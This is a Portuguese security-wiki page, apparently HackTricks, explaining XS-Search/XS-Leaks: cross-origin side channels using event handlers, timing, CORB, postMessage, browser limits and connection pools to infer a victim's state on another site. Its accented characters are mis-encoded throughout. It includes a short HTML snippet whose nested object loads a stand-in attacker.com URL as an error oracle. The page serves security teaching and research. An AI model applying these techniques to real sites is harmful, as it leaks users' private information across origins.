# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

XS-Search √© um m√©todo usado para **extrair informa√ß√µes de origens cruzadas** aproveitando **vulnerabilidades de canal lateral**.

Os componentes-chave envolvidos nesse ataque incluem:

* **Web Vulner√°vel**: O site de destino do qual as informa√ß√µes devem ser extra√≠das.
* **Web do Atacante**: O site malicioso criado pelo atacante, que a v√≠tima visita, hospedando o exploit.
* **M√©todo de Inclus√£o**: A t√©cnica empregada para incorporar a Web Vulner√°vel na Web do Atacante (por exemplo, window.open, iframe, fetch, tag HTML com href, etc.).
* **T√©cnica de Vazamento**: T√©cnicas usadas para discernir diferen√ßas no estado da Web Vulner√°vel com base nas informa√ß√µes coletadas por meio do m√©todo de inclus√£o.
* **Estados**: As duas condi√ß√µes potenciais da Web Vulner√°vel, que o atacante visa distinguir.
* **Diferen√ßas Detect√°veis**: Varia√ß√µes observ√°veis nas quais o atacante se baseia para inferir o estado da Web Vulner√°vel.

### Diferen√ßas Detect√°veis

V√°rios aspectos podem ser analisados para diferenciar os estados da Web Vulner√°vel:

* **C√≥digo de Status**: Distinguindo entre **v√°rios c√≥digos de status de resposta HTTP** de origens cruzadas, como erros de servidor, erros de cliente ou erros de autentica√ß√£o.
* **Uso de API**: Identificando **o uso de APIs da Web** em p√°ginas, revelando se uma p√°gina de origem cruzada emprega uma API da Web JavaScript espec√≠fica.
* **Redirecionamentos**: Detectando navega√ß√µes para p√°ginas diferentes, n√£o apenas redirecionamentos HTTP, mas tamb√©m aqueles acionados por JavaScript ou HTML.
* **Conte√∫do da P√°gina**: Observando **varia√ß√µes no corpo da resposta HTTP** ou em sub-recursos da p√°gina, como o **n√∫mero de frames incorporados** ou disparidades de tamanho em imagens.
* **Cabe√ßalho HTTP**: Observando a presen√ßa ou possivelmente o valor de um **cabe√ßalho de resposta HTTP espec√≠fico**, incluindo cabe√ßalhos como X-Frame-Options, Content-Disposition e Cross-Origin-Resource-Policy.
* **Tempo**: Observando disparidades de tempo consistentes entre os dois estados.

### M√©todos de Inclus√£o

* **Elementos HTML**: O HTML oferece v√°rios elementos para **inclus√£o de recursos de origem cruzada**, como folhas de estilo, imagens ou scripts, obrigando o navegador a solicitar um recurso n√£o HTML. Uma compila√ß√£o de elementos HTML potenciais para esse fim pode ser encontrada em [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frames**: Elementos como **iframe**, **object** e **embed** podem incorporar recursos HTML diretamente na p√°gina do atacante. Se a p√°gina **n√£o tiver prote√ß√£o de enquadramento**, o JavaScript pode acessar o objeto window do recurso emoldurado por meio da propriedade contentWindow.
* **Pop-ups**: O m√©todo **`window.open`** abre um recurso em uma nova guia ou janela, fornecendo um **identificador de janela** para o JavaScript interagir com m√©todos e propriedades seguindo a SOP. Pop-ups, frequentemente usados em logins √∫nicos, contornam as restri√ß√µes de enquadramento e cookies de um recurso de destino. No entanto, os navegadores modernos restringem a cria√ß√£o de pop-ups a certas a√ß√µes do usu√°rio.
* **Requisi√ß√µes JavaScript**: O JavaScript permite solicita√ß√µes diretas a recursos de destino usando **XMLHttpRequests** ou a **Fetch API**. Esses m√©todos oferecem controle preciso sobre a solicita√ß√£o, como optar por seguir redirecionamentos HTTP.

### T√©cnicas de Vazamento

* **Manipulador de Eventos**: Uma t√©cnica de vazamento cl√°ssica em XS-Leaks, onde manipuladores de eventos como **onload** e **onerror** fornecem informa√ß√µes sobre o sucesso ou falha no carregamento do recurso.
* **Mensagens de Erro**: Exce√ß√µes JavaScript ou p√°ginas de erro especiais podem fornecer informa√ß√µes de vazamento diretamente da mensagem de erro ou diferenciando entre sua presen√ßa e aus√™ncia.
* **Limites Globais**: Limita√ß√µes f√≠sicas de um navegador, como capacidade de mem√≥ria ou outros limites impostos pelo navegador, podem sinalizar quando um limite √© atingido, servindo como t√©cnica de vazamento.
* **Estado Global**: Intera√ß√µes detect√°veis com os **estados globais dos navegadores** (por exemplo, a interface History) podem ser exploradas. Por exemplo, o **n√∫mero de entradas** no hist√≥rico de um navegador pode oferecer pistas sobre p√°ginas de origem cruzada.
* **API de Desempenho**: Esta API fornece **detalhes de desempenho da p√°gina atual**, incluindo cronometragem de rede para o documento e recursos carregados, permitindo infer√™ncias sobre os recursos solicitados.
* **Atributos Leg√≠veis**: Alguns atributos HTML s√£o **leg√≠veis de origem cruzada** e podem ser usados como t√©cnica de vazamento. Por exemplo, a propriedade `window.frame.length` permite que o JavaScript conte os frames inclu√≠dos em uma p√°gina da web de origem cruzada.

## Ferramenta XSinator & Paper

XSinator √© uma ferramenta autom√°tica para **verificar navegadores contra v√°rios XS-Leaks conhecidos** explicados em seu paper: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Voc√™ pode **acessar a ferramenta em** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Exclu√≠dos**: Tivemos que excluir XS-Leaks que dependem de **service workers** pois interfeririam com outros vazamentos no XSinator. Al√©m disso, optamos por **excluir XS-Leaks que dependem de configura√ß√µes incorretas e bugs em um aplicativo web espec√≠fico**. Por exemplo, configura√ß√µes incorretas de Compartilhamento de Recursos de Origem Cruzada (CORS), vazamento de postMessage ou Cross-Site Scripting. Adicionalmente, exclu√≠mos XS-Leaks baseados em tempo, pois frequentemente sofrem com lentid√£o, ru√≠do e imprecis√£o.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **T√©cnicas baseadas em tempo**

Algumas das t√©cnicas a seguir v√£o usar o tempo como parte do processo para detectar diferen√ßas nos poss√≠veis estados das p√°ginas da web. Existem diferentes maneiras de medir o tempo em um navegador da web.

**Rel√≥gios**: A API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite aos desenvolvedores obter medi√ß√µes de tempo de alta resolu√ß√£o.\
Existem um n√∫mero consider√°vel de APIs que os atacantes podem abusar para criar rel√≥gios impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), anima√ß√µes CSS e outros.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## T√©cnicas de Manipulador de Eventos

### Onload/Onerror

* **M√©todos de Inclus√£o**: Frames, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumo**: ao tentar carregar um recurso, se os eventos onerror/onload forem acionados com o recurso carregado com sucesso/sem sucesso, √© poss√≠vel descobrir o c√≥digo de status.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

O exemplo de c√≥digo tenta **carregar objetos de scripts de JS**, mas **outros tags** como objetos, folhas de estilo, imagens, √°udios tamb√©m poderiam ser usados. Al√©m disso, tamb√©m √© poss√≠vel injetar a **tag diretamente** e declarar os eventos `onload` e `onerror` dentro da tag (em vez de injet√°-la a partir do JS).

Tamb√©m existe uma vers√£o sem script deste ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Neste caso, se `example.com/404` n√£o for encontrado, `attacker.com/?error` ser√° carregado.

### Tempo de Carregamento

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumo:** A [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. No entanto, outros rel√≥gios poderiam ser usados, como [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que pode identificar tarefas em execu√ß√£o por mais de 50ms.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) outro exemplo em:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tempo de Carregamento + Tarefa Pesada For√ßada

Esta t√©cnica √© semelhante √† anterior, mas o **atacante** tamb√©m ir√° **for√ßar** alguma a√ß√£o a levar um **tempo relevante** quando a **resposta for positiva ou negativa** e medir esse tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tempo de descarregamento/beforeunload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumo:** O [rel√≥gio SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pode ser usado para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios poderiam ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

O tempo necess√°rio para buscar um recurso pode ser medido utilizando os eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). O evento **`beforeunload`** √© acionado quando o navegador est√° prestes a navegar para uma nova p√°gina, enquanto o evento **`unload`** ocorre quando a navega√ß√£o est√° realmente acontecendo. A diferen√ßa de tempo entre esses dois eventos pode ser calculada para determinar a **dura√ß√£o que o navegador passou buscando o recurso**.

### Tempo de Carregamento do Frame Isolado + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumo:** A [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios poderiam ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Observou-se que na aus√™ncia de [Prote√ß√µes de Enquadramento](https://xsleaks.dev/docs/defenses/opt-in/xfo/), o tempo necess√°rio para que uma p√°gina e seus subrecursos sejam carregados pela rede pode ser medido por um atacante. Essa medi√ß√£o √© tipicamente poss√≠vel porque o manipulador `onload` de um iframe √© acionado apenas ap√≥s a conclus√£o do carregamento de recursos e da execu√ß√£o de JavaScript. Para contornar a variabilidade introduzida pela execu√ß√£o de script, um atacante pode empregar o atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dentro do `<iframe>`. A inclus√£o desse atributo restringe in√∫meras funcionalidades, especialmente a execu√ß√£o de JavaScript, facilitando assim uma medi√ß√£o que √© predominantemente influenciada pelo desempenho da rede.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + erro + onload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se voc√™ puder fazer a p√°gina apresentar erro quando o conte√∫do correto for acessado e carregar corretamente quando qualquer conte√∫do for acessado, ent√£o voc√™ pode criar um loop para extrair todas as informa√ß√µes sem medir o tempo.
* **Exemplo de C√≥digo**:

Suponha que voc√™ possa **inserir** a **p√°gina** que cont√©m o **conte√∫do secreto** **dentro de um Iframe**.

Voc√™ pode fazer a v√≠tima procurar pelo arquivo que cont√©m "_**flag**_" usando um **Iframe** (explorando um CSRF, por exemplo). Dentro do Iframe, voc√™ sabe que o _**evento onload**_ ser√° **sempre executado pelo menos uma vez**. Ent√£o, voc√™ pode **alterar** o **URL** do **iframe**, mas alterando apenas o **conte√∫do** do **hash** dentro do URL.

Por exemplo:

1. **URL1**: www.atacante.com/xssearch#tentativa1
2. **URL2**: www.atacante.com/xssearch#tentativa2

Se o primeiro URL foi **carregado com sucesso**, ent√£o, ao **alterar** a parte do **hash** do URL, o evento **onload** **n√£o ser√° acionado** novamente. Mas **se** a p√°gina apresentou algum tipo de **erro** ao **carregar**, ent√£o, o evento **onload** ser√° **acionado novamente**.

Assim, voc√™ pode **distinguir entre** uma p√°gina **carregada corretamente** ou uma p√°gina que tem um **erro** ao ser acessada.

### Execu√ß√£o de Javascript

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se a **p√°gina** estiver **retornando** o **conte√∫do sens√≠vel**, **ou** um **conte√∫do** que pode ser **controlado** pelo usu√°rio. O usu√°rio poderia definir **c√≥digo JS v√°lido no caso negativo**, e **carregar** cada tentativa dentro de tags **`<script>`**, ent√£o nos casos **negativos** o c√≥digo dos atacantes √© **executado**, e nos casos **afirmativos** **nada** ser√° executado.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status e Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumo**: **Cross-Origin Read Blocking (CORB)** √© uma medida de seguran√ßa que impede que p√°ginas da web carreguem determinados recursos sens√≠veis de origens cruzadas para se proteger contra ataques como **Spectre**. No entanto, os atacantes podem explorar seu comportamento protetor. Quando uma resposta sujeita ao **CORB** retorna um `Content-Type` _**protegido pelo CORB**_ com `nosniff` e um c√≥digo de status `2xx`, o **CORB** remove o corpo e os cabe√ßalhos da resposta. Atacantes que observam isso podem inferir a combina√ß√£o do **c√≥digo de status** (indicando sucesso ou erro) e o `Content-Type` (indicando se √© protegido pelo **CORB**), levando a um vazamento potencial de informa√ß√µes.
* **Exemplo de C√≥digo**:

Verifique o link de mais informa√ß√µes para mais detalhes sobre o ataque.

### onblur

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumo**: Vazamento de dados sens√≠veis do atributo id ou name.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

√â poss√≠vel **carregar uma p√°gina** dentro de um **iframe** e usar o **`#valor_id`** para fazer a p√°gina **focar no elemento** do iframe com o id indicado, ent√£o se um sinal **`onblur`** for acionado, o elemento ID existe.\
Voc√™ pode realizar o mesmo ataque com tags **`portal`**.

### Transmiss√µes de postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumo**: Reunir informa√ß√µes sens√≠veis de um postMessage ou usar a presen√ßa de postMessages como um or√°culo para saber o estado do usu√°rio na p√°gina
* **Exemplo de C√≥digo**: `Qualquer c√≥digo ouvindo todas as postMessages.`

Aplica√ß√µes frequentemente utilizam transmiss√µes de [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para se comunicar entre diferentes origens. No entanto, esse m√©todo pode inadvertidamente expor **informa√ß√µes sens√≠veis** se o par√¢metro `targetOrigin` n√£o for especificado corretamente, permitindo que qualquer janela receba as mensagens. Al√©m disso, o simples ato de receber uma mensagem pode atuar como um **or√°culo**; por exemplo, certas mensagens podem ser enviadas apenas para usu√°rios logados. Portanto, a presen√ßa ou aus√™ncia dessas mensagens pode revelar informa√ß√µes sobre o estado ou identidade do usu√°rio, como se est√£o autenticados ou n√£o.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de Limites Globais

### API WebSocket

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumo**: Esgotar o limite de conex√µes WebSocket vaza o n√∫mero de conex√µes WebSocket de uma p√°gina de origem cruzada.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

√â poss√≠vel identificar se, e quantas, **conex√µes WebSocket uma p√°gina-alvo utiliza**. Isso permite que um atacante detecte estados de aplicativos e vaze informa√ß√µes associadas ao n√∫mero de conex√µes WebSocket.

Se uma **origem** usar a **quantidade m√°xima de objetos de conex√£o WebSocket**, independentemente do estado de suas conex√µes, a cria√ß√£o de **novos objetos resultar√° em exce√ß√µes JavaScript**. Para executar esse ataque, o site do atacante abre o site-alvo em um pop-up ou iframe e, ap√≥s o carregamento do site-alvo, tenta criar o n√∫mero m√°ximo poss√≠vel de conex√µes WebSocket. O **n√∫mero de exce√ß√µes lan√ßadas** √© o **n√∫mero de conex√µes WebSocket usadas pela janela do site-alvo**.
### API de Pagamento

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumo**: Detectar Solicita√ß√£o de Pagamento porque apenas uma pode estar ativa por vez.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Este XS-Leak permite a um atacante **detectar quando uma p√°gina de origem cruzada inicia uma solicita√ß√£o de pagamento**.

Como **apenas uma solicita√ß√£o de pagamento pode estar ativa** ao mesmo tempo, se o site alvo estiver usando a API de Solicita√ß√£o de Pagamento, quaisquer **tentativas posteriores de usar essa API falhar√£o**, e causar√£o uma **exce√ß√£o em JavaScript**. O atacante pode explorar isso ao **tentar periodicamente mostrar a interface da API de Pagamento**. Se uma tentativa causar uma exce√ß√£o, significa que o site alvo est√° atualmente usando a API. O atacante pode ocultar essas tentativas peri√≥dicas fechando imediatamente a interface ap√≥s a cria√ß√£o.

### Cronometrando o Loop de Eventos <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Cronometragem (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Resumo:** Medir o tempo de execu√ß√£o de um site abusando do loop de eventos JS de √∫nica thread.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

O JavaScript opera em um modelo de concorr√™ncia de **loop de eventos de √∫nica thread**, significando que **s√≥ pode executar uma tarefa de cada vez**. Essa caracter√≠stica pode ser explorada para medir **quanto tempo o c√≥digo de uma origem diferente leva para ser executado**. Um atacante pode medir o tempo de execu√ß√£o de seu pr√≥prio c√≥digo no loop de eventos ao despachar continuamente eventos com propriedades fixas. Esses eventos ser√£o processados quando o pool de eventos estiver vazio. Se outras origens tamb√©m estiverem despachando eventos para o mesmo pool, um **atacante pode inferir o tempo que leva para esses eventos externos serem executados observando atrasos na execu√ß√£o de suas pr√≥prias tarefas**. Esse m√©todo de monitoramento do loop de eventos para atrasos pode revelar o tempo de execu√ß√£o do c√≥digo de diferentes origens, potencialmente expondo informa√ß√µes sens√≠veis.

{% hint style="warning" %}
Em uma cronometragem de execu√ß√£o, √© poss√≠vel **eliminar fatores de rede** para obter **medidas mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Loop de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Cronometragem (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumo:** Um m√©todo para medir o tempo de execu√ß√£o de uma opera√ß√£o web envolve bloquear intencionalmente o loop de eventos de uma thread e, em seguida, cronometrar **quanto tempo leva para o loop de eventos ficar dispon√≠vel novamente**. Ao inserir uma opera√ß√£o de bloqueio (como um c√°lculo longo ou uma chamada de API s√≠ncrona) no loop de eventos e monitorar o tempo que leva para o c√≥digo subsequente come√ßar a ser executado, √© poss√≠vel inferir a dura√ß√£o das tarefas que estavam sendo executadas no loop de eventos durante o per√≠odo de bloqueio. Essa t√©cnica aproveita a natureza de √∫nica thread do loop de eventos do JavaScript, onde as tarefas s√£o executadas sequencialmente, e pode fornecer insights sobre o desempenho ou comportamento de outras opera√ß√µes compartilhando a mesma thread.
* **Exemplo de C√≥digo**:

Uma vantagem significativa da t√©cnica de medir o tempo de execu√ß√£o bloqueando o loop de eventos √© seu potencial para contornar o **Isolamento de Site**. O **Isolamento de Site** √© um recurso de seguran√ßa que separa diferentes sites em processos separados, com o objetivo de evitar que sites maliciosos acessem diretamente dados sens√≠veis de outros sites. No entanto, ao influenciar a cronometragem de execu√ß√£o de outra origem por meio do loop de eventos compartilhado, um atacante pode extrair indiretamente informa√ß√µes sobre as atividades dessa origem. Este m√©todo n√£o depende do acesso direto aos dados da outra origem, mas sim observa o impacto das atividades dessa origem no loop de eventos compartilhado, evitando assim as barreiras de prote√ß√£o estabelecidas pelo **Isolamento de Site**.

{% hint style="warning" %}
Em uma cronometragem de execu√ß√£o, √© poss√≠vel **eliminar fatores de rede** para obter **medidas mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Pool de Conex√£o

* **M√©todos de Inclus√£o**: Solicita√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Cronometragem (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Resumo:** Um atacante poderia bloquear todos os sockets, exceto 1, carregar o site alvo e ao mesmo tempo carregar outra p√°gina, o tempo at√© a √∫ltima p√°gina come√ßar a carregar √© o tempo que a p√°gina alvo levou para carregar.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Os navegadores utilizam sockets para comunica√ß√£o com o servidor, mas devido aos recursos limitados do sistema operacional e do hardware, os **navegadores s√£o obrigados a impor um limite** no n√∫mero de sockets simult√¢neos. Os atacantes podem explorar essa limita√ß√£o por meio dos seguintes passos:

1. Verificar o limite de sockets do navegador, por exemplo, 256 sockets globais.
2. Ocupar 255 sockets por um per√≠odo prolongado iniciando 255 solicita√ß√µes para v√°rios hosts, projetadas para manter as conex√µes abertas sem completar.
3. Utilizar o 256¬∫ socket para enviar uma solicita√ß√£o para a p√°gina alvo.
4. Tentar uma 257¬™ solicita√ß√£o para um host diferente. Dado que todos os sockets est√£o em uso (conforme os passos 2 e 3), essa solicita√ß√£o ser√° enfileirada at√© que um socket fique dispon√≠vel. O atraso antes que essa solicita√ß√£o prossiga fornece ao atacante informa√ß√µes de cronometragem sobre a atividade de rede relacionada ao 256¬∫ socket (o socket da p√°gina alvo). Essa infer√™ncia √© poss√≠vel porque os 255 sockets do passo 2 ainda est√£o ocupados, implicando que qualquer socket rec√©m-dispon√≠vel deve ser o liberado no passo 3. O tempo necess√°rio para o 256¬∫ socket ficar dispon√≠vel est√° diretamente relacionado ao tempo necess√°rio para a solicita√ß√£o √† p√°gina alvo ser conclu√≠da.

Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de Conex√£o por Destino

* **M√©todos de Inclus√£o**: Solicita√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Cronometragem (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**:
* **Resumo:** √â semelhante √† t√©cnica anterior, mas em vez de usar todos os sockets, o Google **Chrome** imp√µe um limite de **6 solicita√ß√µes simult√¢neas ao mesmo destino**. Se **bloquearmos 5** e depois **lan√ßarmos uma 6¬™** solicita√ß√£o, podemos **cronometrar** e se conseguirmos fazer com que a **p√°gina da v√≠tima envie** mais **solicita√ß√µes** para o mesmo endpoint para detectar um **status** da **p√°gina**, a **6¬™ solicita√ß√£o** levar√° **mais tempo** e podemos detect√°-la.
## T√©cnicas da API de Performance

